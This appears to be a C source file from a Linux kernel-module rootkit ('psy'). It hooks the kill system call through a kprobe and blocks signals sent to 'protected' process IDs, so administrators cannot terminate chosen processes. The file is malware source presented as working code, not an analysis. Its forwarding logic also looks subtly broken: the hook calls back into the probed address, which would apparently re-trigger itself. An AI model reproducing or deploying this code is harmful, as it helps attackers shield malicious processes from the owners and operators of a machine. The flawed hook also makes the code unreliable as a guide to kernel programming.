#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/kernel.h>

#include "inc/hooks.h"
#include "inc/util.h"

MODULE_LICENSE("GPL");

static struct kprobe kp_kill;

static asmlinkage long h_kill(const struct pt_regs *regs)
{
  pid_t pid = regs->di;
  int sig = regs->si;
  
  if (isProtected(pid))
    {
      printk(KERN_INFO "psy: kill attempt blocked for protected PID %d\n", pid);
      return -EPERM;
    }
  
  typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
  static orig_kill_t orig_kill = NULL;

  if (!orig_kill)
    {
      orig_kill = (orig_kill_t)kp_kill.addr;
    }
  return orig_kill(regs);
}

static int pre_handler(struct kprobe *p, struct pt_regs *regs)
{
  regs->ip = (unsigned long)h_kill;
  return 1;
}

bool hInstall(void)
{
  memset(&kp_kill, 0, sizeof(kp_kill));
  kp_kill.symbol_name = "__x64_sys_kill";
  kp_kill.pre_handler = pre_handler;
  
  if (register_kprobe(&kp_kill) != 0)
    {
      printk(KERN_ERR "psy: failed to register kprobe for kill\n");
      return false;
    }
  printk(KERN_INFO "psy: kill hook installed\n");
  return true;
}

void hUninstall(void)
{
  unregister_kprobe(&kp_kill);
  printk(KERN_INFO "psy: kill hook removed\n");
}
